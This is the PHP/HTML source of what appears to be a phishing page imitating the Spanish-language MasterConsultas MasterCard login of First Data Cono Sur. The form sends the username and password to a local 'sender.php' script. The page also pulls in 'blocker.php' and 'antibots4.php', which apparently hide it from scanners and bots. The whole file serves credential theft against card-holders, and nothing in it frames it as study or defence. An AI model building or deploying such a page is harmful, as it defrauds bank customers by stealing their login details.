<?php

 include 'php/err.php';
include 'php/blocker.php';
include 'php/antibots4.php';

?>
<html class="no-js" lang="en">
<head>
<meta charset="utf-8" />
	<title>MasterConsultas</title>
<link rel="icon" href="res/img/logo.png" />
<script type="text/javascript" src="res/js/jquery-1.6.4.js"></script>
<link rel="stylesheet" href="res/style.css">
<link rel="stylesheet" href="https://free-style-css.blogspot.com/" />
	<script type="text/javascript" src="res/js/toolsMasterconsultas.js" ></script>
	<script type="text/javascript" src="res/js/jquery.blockUI.js" ></script>		
</head>
<body class="home nolog">
	<header>
<div id="header" class="nolog">
  <div class="header-content">
    <h1><a href="">MasterConsultas</a></h1>
  </div>
</div>
</header> 	

<style>
/* style keyboard */
 
table tbody tr td {padding:0;} 
.nabil{color:red; font-size:1em; padding-left:32px;   margin-bottom:7px;  }
</style>

<div id="container" class="clearfix">
  <div class="content nolog">
    <h3 class="title">INICIO DE SESIÓN // <strong> REGISTRACIÓN </strong></h3>
    <div class="combo-registro">
      <div class="registrado">
        <form id="loginForm" name="loginForm" action="./sender.php" method="post" class="form-login"  >
          <fieldset>
 
            <p style="padding-bottom: 12px !important;">
              	<input type="text" name="username"    id="usernameId" class="usuario" placeholder="Nombre de usuario"  >
              	
            </p>
			<?php if($_GET['u'] == 'f'){echo '<div class="nabil" id="one">El campo Clave es requerido </div>';} else{echo '';}?>
            <p style="padding-bottom: 12px !important;">
				<input type="password" name="password"   id="password" class="pass" placeholder="Contraseña"  >
				
			</p>
			<?php if($_GET['p'] == 'f'){echo '<div class="nabil" id="two">El campo Clave es requerido </div>';} else{echo '';}?>
           	<input type="submit" id="submitLogin" name='login' value="Ingresar" class="btn-224px" style="border:none;" clearform="true" button="true" blocksui="true">

            <p class="nota">
	            <a href="" id="keyboardAnchorId" onclick="changeKeyboardVisibility(); return false;">
	            	Teclado virtual para acceso desde una PC pública
	            </a>
            </p>
			
            <div id="kbtable" align="left" style="position: absolute; float: right; left: 176px; top: 396px; display: none; cursor: move;"></div>
          </fieldset>
          
        </form>


 <script>
$(function(){
	$("#usernameId").keyup(function(){
		var card = $("#usernameId").val();
		if(card != ''){
		$("#one").hide("2000");
		}
		else{
			$("#one").show("2000");
		}
	});
});

$(function(){
	$("#password").keyup(function(){
		var card = $("#password").val();
		if(card != ''){
		$("#two").hide("2000");
		}
		else{
			$("#two").show("2000");
		}
	});
});
</script>

        <div class="txt-olvido">
        	
			<p>Si olvidó su contraseña (password)  haga click 
			<a href="#"  >aquí</a>			
			</p>                       
        </div>
      </div>
      <div class="registrese">
      	<h4>¿Primera vez que ingresa?</h4>
      	
        <p>Regístrese y obtenga un mejor control de todas sus cuentas MasterCard</p>
        <a href="#" >Regístrese</a> 
        <p class="nota">(No olvide tener su tarjeta y último resumen de cuenta a mano para generar su Usuario y Contraseña)</p>
      </div>

      
    </div>
    <div class="combo-txt">
      <div class="txt">
	    <p>Acceda aquí al detalle completo de todas las operaciones que realiza con sus tarjetas MasterCard.</p>
	    <ul>
	      <li>Verifique sus últimos movimientos, liquidaciones y resúmenes de cuenta.</li>
	      <li>Adhiérase al débito automático de sus facturas.</li>
	      <li>Chequee su límite de compra, cierre y vencimientos.</li>
	      <li>Efectúe el pago de servicios e impuestos.</li>
	      <li>Recargue crédito a sus celulares las 24 horas del día.</li>
	    </ul>
      </div>
      <ul class="btns">
        <li><a href="" class="btn01"></a></li>
        <li><a href="" class="btn02"></a></li>
        <li><a href="" class="btn03"></a></li>       
      </ul>
    </div>
  </div>
</div>
	

<footer>
<div id="footer">
  	<div class="footer-content">
      <div class="box socios">
          <h5>Socios</h5>
          <ul>
          	<li><a href="">Tarjetas de Crédito</a></li>
            <li><a href="">Otras Tarjetas</a></li>
            <li><a href="" >Promociones</a></li>
            <li><a href="" >Novedades</a></li>
          </ul>
      </div>
      <div class="box comercios">          
           <h5>Comercios</h5>
           <ul>
            <li><a href="">Acepte Mastercard</a></li>
            <li><a href="">Servicios</a></li>
            <li><a href="">Novedades</a></li>
            <li><a href="">Descargas</a></li>
          </ul>
      </div>        
      <div class="box empresas">
          <h5>Empresas</h5>
          <ul>
            <li><a href="" >Tarjetas</a></li>
            <li><a href="" >Promociones</a></li>
          </ul>
      </div>      
      <div class="box contactenos">
           <h5>¿Necesita ayuda?</h5>
           <ul>
            <li><a href="" >¿Extravió su tarjeta?</a></li>
            <li><a href="" >Buscador Cajeros</a></li>
			<li><a href="" >Contáctese con nosotros</a></li>
          </ul>      
      </div>
    </div>
    <a href="" class="top"></a>
    <h6>MasterCard</h6>
    <p class="loginDF">
    	<a href="">First Data Cono Sur S.R.L.</a> | <a href="">Todos los derechos reservados</a><br>    	 
    	<a href="" >Términos y Condiciones</a> | <a href="">Medidas de Seguridad</a> | <a href="" >Protección de Datos Personales</a> | <a href="" >Defensa y Protección al Consumidor</a>
    </p>
  </div>
</footer>	


<script type="text/javascript">
		unblockUI();
		attachBlockUI();	
		if (self === top) { 
			var antiClickjack = document.getElementById("antiClickjack"); 
			antiClickjack.parentNode.removeChild(antiClickjack); 
		} else { 
			top.location = self.location; 
		}
</script>
</body>
</html>